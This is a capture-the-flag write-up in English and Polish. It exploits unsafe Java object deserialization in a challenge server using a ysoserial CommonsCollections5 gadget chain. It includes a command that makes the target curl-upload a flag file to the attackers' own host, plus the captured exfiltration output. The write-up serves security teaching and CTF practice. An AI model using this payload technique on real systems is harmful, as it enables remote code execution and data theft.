## akashic records (pwn, 200p)

###eng
[pl](#pl-version)

in the task we get a simple java application to analyse.
most of the application is dedicated to setting up a rest api, however there is an interesting class:

```java
// debug

package com.supersecure.rest;

import com.supersecure.control.imaincontrol;
import com.supersecure.control.impl.maincontrol;
import com.supersecure.model.ibook;
import com.supersecure.model.impl.book;
import org.apache.commons.collections.list.treelist;

import java.io.ioexception;
import java.io.objectinputstream;
import java.net.serversocket;
import java.net.socket;

public class bookadd implements runnable {
    private serversocket serversocket = null;
    private imaincontrol maincontrol = null;
    // for evaluation purpose
    private final treelist exceptionlist = new treelist();

    private void startsocket() {
        if (serversocket != null) {
            try {
                if (!serversocket.isclosed()) {
                    serversocket.close();
                }
            } catch (ioexception e) {
                exceptionlist.add(e);
                e.printstacktrace();
            }
            serversocket = null;
        }
        try {
            serversocket = new serversocket(6666);
            if (maincontrol == null) {
                maincontrol = new maincontrol();
            }
        } catch (ioexception e) {
            exceptionlist.add(e);
            e.printstacktrace();
        }
    }

    @override
    public void run() {
        startsocket();
        while (true) {
            try {
                socket socket = serversocket.accept();
                (new thread(() -> {
                    objectinputstream inputstream = null;
                    try {
                        inputstream = new objectinputstream(socket.getinputstream());
                        ibook book = (book) inputstream.readobject();
                        maincontrol.addbook(book);
                    } catch (ioexception | classnotfoundexception e) {
                        exceptionlist.add(e);
                        e.printstacktrace();
                    }

                })).start();
            } catch (ioexception e) {
                exceptionlist.add(e);
                e.printstacktrace();
                startsocket();
            }
        }
    }
}

```

as can be seen this class exposes a raw socket connection and accepts serialized java objects to deserialize.
deserialization of payloads from untrusted sources is a very common vulnerability, since most deserializers provide an option to run code in order to set values for transient fields.
it is the case for python pickle, for java xmldecoder and it is also for objectinputstream.

in this case there are a few known common libraries that contain classes which can be used to invoke a shell command during deserialization.
in our example in the pom.xml we could see:

```
        <dependency>
            <groupid>commons-collections</groupid>
            <artifactid>commons-collections</artifactid>
            <version>3.1</version>
        </dependency>
```

which is one of the libraries with gadget chain we need.
there is a github project with paylad generator so we used it: https://github.com/frohoff/ysoserial
generating a payload with 

`java -jar ysoserial-0.0.5-snapshot-all.jar commonscollections5 "curl ourhost.net:6666 -t /tmp/weirdfilename" > payload`

and then sending the generated payload to the endpoint provided in the task.
as a result we got:

```
connection from [139.59.135.121] port 6666 [tcp/*] accepted (family 2, sport 56867)
put /weirdfilename http/1.1
user-agent: curl/7.38.0
host: ourhost.net:6666
accept: */*
content-length: 45
expect: 100-continue

flag{i_foresee_an_ap0k4lypse_f0r_21_09_2036}
```

###pl version

w zadaniu dostajemy prostą aplikacje javową do analizy.
większość aplikacji poświecona jest ustawieniu api restowego, jednak jest tam jedna interesująca klasa:

```java
// debug

package com.supersecure.rest;

import com.supersecure.control.imaincontrol;
import com.supersecure.control.impl.maincontrol;
import com.supersecure.model.ibook;
import com.supersecure.model.impl.book;
import org.apache.commons.collections.list.treelist;

import java.io.ioexception;
import java.io.objectinputstream;
import java.net.serversocket;
import java.net.socket;

public class bookadd implements runnable {
    private serversocket serversocket = null;
    private imaincontrol maincontrol = null;
    // for evaluation purpose
    private final treelist exceptionlist = new treelist();

    private void startsocket() {
        if (serversocket != null) {
            try {
                if (!serversocket.isclosed()) {
                    serversocket.close();
                }
            } catch (ioexception e) {
                exceptionlist.add(e);
                e.printstacktrace();
            }
            serversocket = null;
        }
        try {
            serversocket = new serversocket(6666);
            if (maincontrol == null) {
                maincontrol = new maincontrol();
            }
        } catch (ioexception e) {
            exceptionlist.add(e);
            e.printstacktrace();
        }
    }

    @override
    public void run() {
        startsocket();
        while (true) {
            try {
                socket socket = serversocket.accept();
                (new thread(() -> {
                    objectinputstream inputstream = null;
                    try {
                        inputstream = new objectinputstream(socket.getinputstream());
                        ibook book = (book) inputstream.readobject();
                        maincontrol.addbook(book);
                    } catch (ioexception | classnotfoundexception e) {
                        exceptionlist.add(e);
                        e.printstacktrace();
                    }

                })).start();
            } catch (ioexception e) {
                exceptionlist.add(e);
                e.printstacktrace();
                startsocket();
            }
        }
    }
}

```

jak widać klasa wystawia surowy socket który przyjmuje serializowane obiekty javy i próbuje je deserializować.
deserializacja danych pochodzących z niezaufanych źródeł to dość znana podatność, szczególnie że większość deserializerów umożliwia wykonanie kodu, aby ustawić wartości pól transient.
tak jest w przypadku pythonowego pickle, javowego xmldecoder i tak samo jest i dla objectinputstream.

w tym przypadku istnieje kilka popularnych bibliotek, zawierających klasy, które można wykorzystać do wywołania kodu na zdalnej maszynie podczas deserializacji.
w naszym przykładzie w pom.xml widzimy:

```
        <dependency>
            <groupid>commons-collections</groupid>
            <artifactid>commons-collections</artifactid>
            <version>3.1</version>
        </dependency>
```

które jest jedną z bibliotek zawierajacych interesujący nas gadget chain.
istnieje projekt na githubie z gotowym generatorem payloadów więc użyjemy go: https://github.com/frohoff/ysoserial
generujemy payload przez:

`java -jar ysoserial-0.0.5-snapshot-all.jar commonscollections5 "curl ourhost.net:6666 -t /tmp/weirdfilename" > payload`

i wysyłamy go do endpointa podanego w zadaniu.
w efekcie dostajemy:

```
connection from [139.59.135.121] port 6666 [tcp/*] accepted (family 2, sport 56867)
put /weirdfilename http/1.1
user-agent: curl/7.38.0
host: ourhost.net:6666
accept: */*
content-length: 45
expect: 100-continue

flag{i_foresee_an_ap0k4lypse_f0r_21_09_2036}
```